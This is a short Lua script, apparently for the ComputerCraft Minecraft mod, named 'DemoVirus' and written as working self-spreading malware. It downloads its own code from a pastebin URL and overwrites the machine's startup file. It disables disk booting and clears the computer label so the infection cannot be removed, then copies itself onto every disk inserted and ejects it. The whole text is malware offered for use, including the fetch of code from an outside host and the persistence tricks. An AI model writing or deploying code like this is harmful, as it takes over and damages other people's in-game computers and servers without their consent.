print "Welcome to DemoVirus!"
print "The simple, lightweight virus."

local function delete(file)
	if fs.exists(file) then fs.delete(file) end
end

settings.set("shell.allow_startup", true) -- Force local startups to be allowed
local function copy_to(file)
	delete(file) -- Delete it in case it's already a folder
	delete(file .. ".lua") -- Delete possibly conflicting .lua versions
	local h = http.get "https://pastebin.com/raw/2rZYfYhT"
	local f = fs.open(file, "w")
	f.write(h.readAll()) -- Write self to specified file
	f.close()
	h.close()
end
copy_to "startup" -- Overwrite startup
settings.set("shell.allow_disk_startup", false) -- Prevent removing it via booting from disks
settings.save ".settings" -- Save these settings
os.setComputerLabel(nil) -- Remove label to prevent putting it in a disk drive
while true do 
	local _, side = coroutine.yield "disk" -- Watch for adjacent disks
	if side then
		local path = disk.getMountPath(side) -- Find where they'll be mounted
		copy_to(fs.combine(path, "startup")) -- Copy to them, too
		disk.eject(side) -- Eject them
	end
end